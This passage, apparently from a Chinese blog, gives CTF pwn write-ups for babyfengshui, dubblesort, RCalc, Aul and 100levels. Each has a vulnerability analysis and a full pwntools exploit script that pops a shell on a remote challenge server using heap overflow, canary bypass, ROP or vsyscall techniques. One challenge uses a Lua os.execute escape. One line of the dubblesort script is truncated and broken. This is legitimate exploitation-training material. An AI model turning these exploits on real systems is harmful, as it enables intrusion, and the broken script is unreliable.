<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.134&quot;</span>,<span class="number">54735</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./babyfengshui&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,length,text</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Action: &quot;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;description: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;name: &quot;</span>,<span class="string">&#x27;ffff&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;length: &quot;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;text: &quot;</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Action: &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">display</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Action: &quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">updata</span>(<span class="params">index,length,text</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Action: &quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;length: &quot;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;text: &quot;</span>,text)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x198</span>+p32(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">add(<span class="number">0x100</span>,<span class="number">0x19C</span>,payload)</span><br><span class="line"></span><br><span class="line">display(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;description: &quot;</span>)</span><br><span class="line">free_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;free&quot;</span>,free_addr) </span><br><span class="line">offset = free_addr - libc.dump(<span class="string">&quot;free&quot;</span>) </span><br><span class="line">system_addr = offset + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line"></span><br><span class="line">updata(<span class="number">1</span>,<span class="number">4</span>,p32(system_addr))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222224732060.png" alt="image-20201222224732060"></p>
<h3 id="21-dubblesort"><a href="#21-dubblesort" class="headerlink" title="21. dubblesort"></a>21. dubblesort</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223081129516.png" alt="image-20201223081129516"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223081203985.png" alt="image-20201223081203985"></p>
<h4 id="代码分析-17"><a href="#代码分析-17" class="headerlink" title="代码分析"></a>代码分析</h4><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223082332571.png" alt="image-20201223082332571"></p>
<p>程序的功能是实现一个排序，漏洞主要出现如图所示的两个位置。</p>
<p>没有调用memset对buf清空，里面可能有敏感数据。对输入的整数个数没有上限限制，可以造成栈溢出。</p>
<h4 id="思路及利用-17"><a href="#思路及利用-17" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>首先查看buf里的数据，发现<code>_GLOBAL_OFFSET_TABLE_</code>。可以据此算出libc基址，进而得到system函数地址。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223082737721.png" alt="image-20201223082737721"></p>
<p><code> 0xffffcee0-0xffffcec8=24</code>也就是说，只要输入24个字符，就顺带输出<code>_GLOBAL_OFFSET_TABLE_</code>。</p>
<p>然后考虑栈溢出，canary保护开启，需要泄露或绕过。</p>
<p>显然这个程序中泄露是不可行的，而sacnf的特性能帮助我们绕过canary。</p>
<p>当 scanf 函数接收到不符合格式化字符串的字符时，不会将其放入栈空间中。所以可以在canary处输入<code>+、—</code>等字符绕过canary。</p>
<p><code>_GLOBAL_OFFSET_TABLE_</code>与libc的基址的偏移固定，需要先算出来。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223091146979.png" alt="image-20201223091146979">可以知道v12处是canary。</p>
<p>因此，我们先输入(0x70-0x10)/4 = 24个整数，然后接下来输入+或-号，跳过当前输入，然后我们到达ebp-0xC处，距离返回地址ebp+0x4还差0x10/4=4个，因此，我们继续输入4个整数，接下来，我们再输入ROP即可。</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf8  </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">sh = process(<span class="string">&#x27;./dubblesort&#x27;</span>,env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">&quot;./libc_32.so.6&quot;</span>&#125;)  </span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.134&#x27;</span>, <span class="number">49887</span>)  </span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)  </span><br><span class="line">off = <span class="number">0x1AE244</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#泄露地址并计算出libc的地址  </span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x1C</span>  </span><br><span class="line">sh.sendafter(<span class="string">&#x27;name :&#x27;</span>,payload)  </span><br><span class="line">sh.recvuntil(payload)  </span><br><span class="line"><span class="comment">#计算libc加载地址  </span></span><br><span class="line">libc_base = u32(sh.recv(<span class="number">4</span>)) - off  </span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]  </span><br><span class="line">binsh_addr = libc_base + l</span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base=&#x27;</span>,<span class="built_in">hex</span>(libc_base)  </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;system_addr=&#x27;</span>,<span class="built_in">hex</span>(system_addr)  </span><br><span class="line">  </span><br><span class="line">n = <span class="number">35</span>  </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;sort :&#x27;</span>,<span class="built_in">str</span>(n))  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,n<span class="number">-11</span>):  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;number :&#x27;</span>,<span class="built_in">str</span>(<span class="number">0</span>))  </span><br><span class="line">  </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;number :&#x27;</span>,<span class="string">&#x27;+&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">9</span>):  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;number :&#x27;</span>,<span class="built_in">str</span>(system_addr))  </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;number :&#x27;</span>,<span class="built_in">str</span>(binsh_addr))  </span><br><span class="line">  </span><br><span class="line">sh.interactive()  </span><br></pre></td></tr></table></figure>

<p>最终结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223091348996.png" alt="image-20201223091348996"></p>
<h3 id="22-RCalc"><a href="#22-RCalc" class="headerlink" title="22. RCalc"></a>22. RCalc</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223091552374.png" alt="image-20201223091552374"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223091611277.png" alt="image-20201223091611277"></p>
<h4 id="代码分析-18"><a href="#代码分析-18" class="headerlink" title="代码分析"></a>代码分析</h4><p>整个程序模拟了一个计算器。</p>
<p>程序开始，申请了两个堆，且没有free，结合之后的代码可以知道，一个是0x100的存储数据的堆，一个是0x320的存储自定义的canary的堆。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223093330611.png" alt="image-20201223093330611"></p>
<p>向canary中写入随机数，和读取canary中的值，</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223093513368.png" alt="image-20201223093513368"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223093614793.png" alt="image-20201223093614793"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223093659464.png" alt="image-20201223093659464"></p>
<p>与canary的值不一样说明有溢出，报错。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223093802866.png" alt="image-20201223093802866">这里没有限制输入，是可以做到栈溢出的。</p>
<p>没有对堆上的存储做限制。是可以不断存储数据覆盖canary的。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223094116027.png" alt="image-20201223094116027"></p>
<h4 id="思路及分析"><a href="#思路及分析" class="headerlink" title="思路及分析"></a>思路及分析</h4><p>这道题实际上的思路和常规的有canary的栈溢出题目一样，覆盖或是泄露canary值然后就是常规的栈溢出、rop攻击。</p>
<p>不同的是这里的canary是自定义的，在一个堆中。但是上述分析可以看到，save和canary两个堆是连续申请的且没有free，也就是说这两个堆是连续的，而且并没有对向save堆写入数据有任何限制，是可以做到堆溢出的。</p>
<p>接下来就是计算需要save多少次数据才可以覆盖canary。动态调试，找到save和canary对应的堆。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223094827128.png" alt="image-20201223094827128"></p>
<p>之前差值为<code>（ 0x6033b0-0x6032a0）/8=34</code>，也就是说存储34次就能覆盖掉canary。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setcanary</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">34</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;input 2 integer: &#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;Save the result? &#x27;</span>, <span class="string">&#x27;yes&#x27;</span></span><br></pre></td></tr></table></figure>

<p>这样就能将canary覆盖为0，接下来就是栈溢出rop的常规操作。</p>
<p>先泄露地址，得到基地址，找到system。需要一个传参用的gadget，<code>pop rdi ，ret</code></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223095301158.png" alt="image-20201223095301158"></p>
<p>编写exp：</p>
<p><strong>需要注意的是，libc版本问题</strong>，如果出现如图的情况说明版本不对，地址对不上。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223112047972.png" alt="image-20201223112047972"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    io=process(<span class="string">&quot;./RCalc&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&#x27;220.249.52.134&#x27;</span>,<span class="number">44237</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc6_2.23-0ubuntu10_amd64.so&#x27;</span>)</span><br><span class="line">puts_plt = <span class="number">0x400850</span></span><br><span class="line">__libc_start_main_ = <span class="number">0x601FF0</span></span><br><span class="line"></span><br><span class="line">rdi_ret = <span class="number">0x0000000000401123</span></span><br><span class="line">main_addr = <span class="number">0x0000000000401036</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pass_canary</span>(<span class="params">k</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">35</span>+k):</span><br><span class="line">        io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">        io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">        io.recvuntil(<span class="string">&quot;input 2 integer: &quot;</span>)</span><br><span class="line">        io.send(<span class="string">&quot;0\n0\n&quot;</span>)</span><br><span class="line">        io.recvuntil(<span class="string">&quot;Save the result? &quot;</span>)</span><br><span class="line">        io.sendline(<span class="string">&quot;yes&quot;</span>)</span><br><span class="line">        <span class="comment">#sleep(0.2)</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    payload+=<span class="string">&quot;\x00&quot;</span>*<span class="number">0x110</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)</span><br><span class="line">    payload+=p64(rdi_ret)</span><br><span class="line">    payload+=p64(__libc_start_main_)</span><br><span class="line">    payload+=p64(puts_plt)</span><br><span class="line">    payload+=p64(main_addr)</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Input your name pls: &quot;</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line">    pass_canary(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    libc_start_main_addr = u64(io.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    libc_addr_base=libc_start_main_addr-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    log.success(<span class="string">&quot;libc_start_main_addr &quot;</span>+<span class="built_in">hex</span>(libc_start_main_addr))</span><br><span class="line">    log.success(<span class="string">&quot;libc_addr_base &quot;</span>+<span class="built_in">hex</span>(libc_addr_base))</span><br><span class="line"></span><br><span class="line">    system_addr=libc_addr_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    bin_sh_addr=libc_addr_base+libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">    payload=<span class="string">&quot;\x00&quot;</span>*<span class="number">0x110</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)</span><br><span class="line">    payload+=p64(rdi_ret)</span><br><span class="line">    payload+=p64(bin_sh_addr)</span><br><span class="line">    payload+=p64(system_addr)</span><br><span class="line">    payload+=p64(main_addr)</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Input your name pls: &quot;</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line">    pass_canary(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    io.interactive() </span><br></pre></td></tr></table></figure>

<p>最终结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223111914992.png" alt="image-20201223111914992"></p>
<h3 id="23-Aul"><a href="#23-Aul" class="headerlink" title="23. Aul"></a>23. Aul</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109160338252.png" alt="image-20210109160338252"></p>
<p>题目没有附件，使用nc连接后，发现是一个游戏程序，随便输入发现提示输入help获得更多信息。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109160637417.png" alt="image-20210109160637417"></p>
<p>输入help后发现是一个lua编写的程序。</p>
<p><strong><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109160729589.png" alt="image-20210109160729589"></strong></p>
<p>通过查询反编译的方式，在补足字节码头部后得到反编译得到源码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function make_board(size)</span><br><span class="line">   local board &#x3D; &#123; size &#x3D; size &#125;</span><br><span class="line">   setmetatable(board, &#123; __tostring &#x3D; board_tostring &#125;)</span><br><span class="line"></span><br><span class="line">   for n &#x3D; 0, size * size - 1 do</span><br><span class="line">      board[n] &#x3D; 0</span><br><span class="line">   end</span><br><span class="line"></span><br><span class="line">   return board</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">function populate_board(board, filled, seed)</span><br><span class="line">   local size &#x3D; board.size</span><br><span class="line">   if seed then math.randomseed(seed) end</span><br><span class="line">   filled &#x3D; filled or size * size * 3 &#x2F; 4</span><br><span class="line"></span><br><span class="line">   local function rand()</span><br><span class="line">      local c</span><br><span class="line">      repeat c &#x3D; math.random(size * size) - 1 until board[c] &#x3D;&#x3D; 0</span><br><span class="line">      return c</span><br><span class="line">   end</span><br><span class="line"></span><br><span class="line">   if filled &gt; 0 then</span><br><span class="line">      for _,v in ipairs&#123;&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;&#125; do board[rand()] &#x3D; v end</span><br><span class="line"></span><br><span class="line">      for n &#x3D; 1, filled-4 do</span><br><span class="line">         board[rand()] &#x3D; math.random(4)</span><br><span class="line">      end</span><br><span class="line"></span><br><span class="line">      return fall(board)</span><br><span class="line">   end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">function board_tostring(board)</span><br><span class="line">   local lines &#x3D; &#123;&#125;</span><br><span class="line">   local size &#x3D; board.size</span><br><span class="line">   for y &#x3D; 0, size - 1 do</span><br><span class="line">      local line &#x3D; &quot;|&quot;</span><br><span class="line">      for x &#x3D; 0, size - 1 do</span><br><span class="line">         line &#x3D; line .. &quot; &quot; .. board[x+y*size]</span><br><span class="line">      end</span><br><span class="line">      table.insert(lines, line .. &quot; |&quot;)</span><br><span class="line">   end</span><br><span class="line">   return table.concat(lines,&quot;\n&quot;)</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">function fall(board)</span><br><span class="line">   local size &#x3D; board.size</span><br><span class="line">   local new_board &#x3D; make_board(size, 0)</span><br><span class="line"></span><br><span class="line">   local function fall_column(col)</span><br><span class="line">      local dest &#x3D; size - 1</span><br><span class="line">      for y &#x3D; size-1, 0, -1 do</span><br><span class="line">         if board[y*size + col] ~&#x3D; 0 then</span><br><span class="line">            new_board[dest*size + col] &#x3D; board[y*size + col]</span><br><span class="line">            dest &#x3D; dest - 1</span><br><span class="line">         end</span><br><span class="line">      end</span><br><span class="line">   end</span><br><span class="line"></span><br><span class="line">   for x&#x3D;0, size-1 do</span><br><span class="line">      fall_column(x)</span><br><span class="line">   end</span><br><span class="line"></span><br><span class="line">   return new_board</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">function rotate(board)</span><br><span class="line">   local size &#x3D; board.size</span><br><span class="line">   local new_board &#x3D; make_board(size, 0)</span><br><span class="line"></span><br><span class="line">   for y &#x3D; 0, size-1 do</span><br><span class="line">      local dest_col &#x3D; size - 1 - y</span><br><span class="line"></span><br><span class="line">      for n &#x3D; 0, size-1 do</span><br><span class="line">         new_board[n*size + dest_col] &#x3D; board[y*size + n]</span><br><span class="line">      end</span><br><span class="line">   end</span><br><span class="line"></span><br><span class="line">   return new_board</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">function crush(board)</span><br><span class="line">   local size &#x3D; board.size</span><br><span class="line">   local new_board &#x3D; make_board(size, 0)</span><br><span class="line">   local crushers &#x3D; &#123;&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;&#125;</span><br><span class="line"></span><br><span class="line">   for n&#x3D;0, size-1 do</span><br><span class="line">      new_board[n] &#x3D; board[n]</span><br><span class="line">   end</span><br><span class="line"></span><br><span class="line">   for n &#x3D; size, size*size - 1 do</span><br><span class="line">      if board[n-size] &#x3D;&#x3D; crushers[board[n]] then</span><br><span class="line">         new_board[n] &#x3D; 0</span><br><span class="line">      else</span><br><span class="line">         new_board[n] &#x3D; board[n]</span><br><span class="line">      end</span><br><span class="line">   end</span><br><span class="line"></span><br><span class="line">   return new_board</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">function rotate_left(board)</span><br><span class="line">   return rotate(rotate(rotate(board)))</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">function readAll(file)</span><br><span class="line">    local f &#x3D; io.open(file, &quot;rb&quot;)</span><br><span class="line">    local content &#x3D; f:read(&quot;*all&quot;)</span><br><span class="line">    f:close()</span><br><span class="line">    return content</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">function help()</span><br><span class="line">	local l &#x3D; string.sub(readAll(&quot;server.luac&quot;), 2)</span><br><span class="line"></span><br><span class="line">	writeraw(l, string.len(l))</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">quit &#x3D; false</span><br><span class="line">function exit()</span><br><span class="line">	quit &#x3D; true</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">function run_step(board)</span><br><span class="line">   local cmd &#x3D; readline()</span><br><span class="line"></span><br><span class="line">   if(string.len(cmd) &#x3D;&#x3D; 0) then</span><br><span class="line">   	 exit()</span><br><span class="line">   	 return nil</span><br><span class="line">   end</span><br><span class="line"></span><br><span class="line">   -- prevent injection attacks</span><br><span class="line">   if(string.find(cmd, &quot;function&quot;)) then</span><br><span class="line">   	 return nil</span><br><span class="line">   end</span><br><span class="line"></span><br><span class="line">   if(string.find(cmd, &quot;print&quot;)) then</span><br><span class="line">   	 return nil</span><br><span class="line">   end</span><br><span class="line"></span><br><span class="line">   local f &#x3D; load(&quot;return &quot; .. cmd)()</span><br><span class="line"></span><br><span class="line">   if f &#x3D;&#x3D; nil then</span><br><span class="line">   	 return nil</span><br><span class="line">   end</span><br><span class="line"></span><br><span class="line">   return f(board)</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">function game()</span><br><span class="line">   local board &#x3D; populate_board(make_board(8))</span><br><span class="line"></span><br><span class="line">   repeat</span><br><span class="line">      </span><br><span class="line">      writeline(board_tostring(board) .. &quot;\n&quot;)</span><br><span class="line">      </span><br><span class="line">      local b &#x3D; run_step(board)</span><br><span class="line"></span><br><span class="line">      if quit then</span><br><span class="line">      	break</span><br><span class="line">      end</span><br><span class="line"></span><br><span class="line">      if b ~&#x3D; nil then</span><br><span class="line">      	 board &#x3D; b</span><br><span class="line">         board &#x3D; fall(crush(fall(board)))</span><br><span class="line">      else</span><br><span class="line">         writeline(&quot;Didn&#39;t understand. Type &#39;rotate&#39;, &#39;rotate_left&#39;, &#39;exit&#39;, or &#39;help&#39;.\n&quot;)</span><br><span class="line">      end</span><br><span class="line"></span><br><span class="line">   until false</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">writeline(&quot;let&#39;s play a game\n&quot;)</span><br><span class="line"></span><br><span class="line">game()</span><br></pre></td></tr></table></figure>

<p>一个 lua 逃逸，挺直白的，直接输入<code>os.execute(&quot;/bin/sh&quot;)</code>提权</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109161629435.png" alt="image-20210109161629435"></p>
<h3 id="24-1000levevls"><a href="#24-1000levevls" class="headerlink" title="24. 1000levevls"></a>24. 1000levevls</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228212021372.png" alt="image-20201228212021372"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228212100952.png" alt="image-20201228212100952"></p>
<h4 id="代码分析-19"><a href="#代码分析-19" class="headerlink" title="代码分析"></a>代码分析</h4><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228212129503.png" alt="image-20201228212129503"></p>
<p>找到一个栈溢出，但是因为开启了PIE，所以覆盖返回地址不可行，因为不能确定具体的地址，但是可以用vsyscall滑栈的方法。</p>
<p>接下开就是思考如何调用system。<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228214540803.png" alt="image-20201228214540803"></p>
<p>然后发现程序中有用到system，考虑是否可以利用。查看一下汇编，发现一个有趣的点，system地址入栈是在判断f之前的。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228214648552.png" alt="image-20201228214648552"></p>
<p>同时查看主函数的调用关系，发现go函数和hint函数是公用一个栈的。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228214824523.png" alt="image-20201228214824523"></p>
<p>同时还可以在go函数中看到，如果开始输入的是小于等于0的，那么v5不会初始化，也就是说如果先执行hint，然后输入v2小于等于0，那么v5就是system的地址，同时我们还有再一次输入的机会，并且这次输入将写入v6（v5+v3），也就是我们可以以system地址为基准，通过偏移得到任意的libc函数。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228220305556.png" alt="image-20201228220305556"></p>
<h4 id="思路及利用-18"><a href="#思路及利用-18" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>前面提到，控制程序执行只能通过滑栈的方式，也就是意味着很难有输入参数，因此自然想到将system地址改为onegadget地址，然后滑栈执行。</p>
<p>接下来就是找到one_gadget与system的偏移和滑栈的偏移。而溢出函数ans如图所示，go的rsp就是ans的rbp。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228221651239.png" alt="image-20201228221651239"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228222925316.png" alt="image-20201228222925316"></p>
<p>因此进入ans后栈的情况为：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228224934094.png" alt="image-20201228224934094">所以需要有3个vsyscall滑栈到go_rbp-0x110.</p>
<p>最终exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./100levels&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.134&quot;</span>,<span class="number">41349</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">one_gadget = <span class="number">0x4526a</span></span><br><span class="line">system_offset = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">vsyscall_addr = <span class="number">0xffffffffff600000</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Choice:&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Choice:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;levels?&#x27;</span>,<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&#x27;</span>,<span class="built_in">str</span>(one_gadget-system_offset))</span><br><span class="line"><span class="comment">#需要先回答对99个问题，最后第100个进行溢出</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">99</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Question: &quot;</span>)</span><br><span class="line">    v9 = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot; &quot;</span>)[:<span class="number">-1</span>])</span><br><span class="line">    p.recvuntil(<span class="string">&quot;* &quot;</span>)</span><br><span class="line">    v10 = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot; &quot;</span>)[:<span class="number">-1</span>])</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Answer:&quot;</span>, <span class="built_in">str</span>(v9 * v10))</span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * (<span class="number">0x30</span>+<span class="number">8</span>)+p64(vsyscall_addr) *<span class="number">3</span></span><br><span class="line">p.sendafter(<span class="string">&quot;Answer:&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

